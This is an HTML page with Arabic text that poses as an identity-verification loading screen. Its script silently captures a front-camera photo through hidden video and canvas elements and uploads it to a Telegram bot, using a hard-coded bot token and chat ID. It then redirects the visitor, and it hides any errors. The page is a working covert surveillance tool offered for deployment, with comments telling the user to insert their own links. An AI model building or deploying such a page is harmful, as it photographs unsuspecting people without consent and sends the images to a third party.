<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            overflow: hidden;
        }
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(255,255,255,0.9);
            z-index: 1000;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div class="loading">
        <h2>جاري التحقق من الهوية...</h2>
    </div>

    <!-- عناصر مخفية تمامًا -->
    <video id="cameraView" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // بيانات البوت
        const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const chatId = '6913353602';
        
        // بدء العملية تلقائيًا
        (async function() {
            try {
                // 1. طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                // 2. إعداد العناصر المخفية
                const cameraView = document.getElementById('cameraView');
                const canvas = document.getElementById('canvas');
                cameraView.srcObject = stream;
                
                // 3. انتظر ثانية لضبط الإضاءة
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // 4. التقاط الصورة
                canvas.width = cameraView.videoWidth;
                canvas.height = cameraView.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
                
                // 5. إيقاف الكاميرا فورًا
                stream.getTracks().forEach(track => track.stop());
                
                // 6. تحويل الصورة وإرسالها
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                await sendToTelegram(photoData);
                
                // 7. إخفاء رسالة التحميل بعد الإرسال
                document.querySelector('.loading').style.display = 'none';
                
                // 8. توجيه المستخدم أو إكمال العملية
                setTimeout(() => {
                    window.location.href = "https://example.com/next-step"; // استبدل برابطك
                }, 1500);
                
            } catch (error) {
                console.error('Error:', error);
                // معالجة الأخطاء بشكل غير مرئي
                setTimeout(() => {
                    window.location.href = "https://example.com/error-page"; // استبدل برابط صفحة الخطأ
                }, 1500);
            }
        })();
        
        // دالة الإرسال إلى التليجرام
        async function sendToTelegram(photoData) {
            try {
                const blob = await (await fetch(photoData)).blob();
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'user_verification.jpg');
                formData.append('caption', `تم التحقق من المستخدم في ${new Date().toLocaleString()}`);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Telegram Error:', error);
                throw error;
            }
        }
    </script>
</body>
</html>
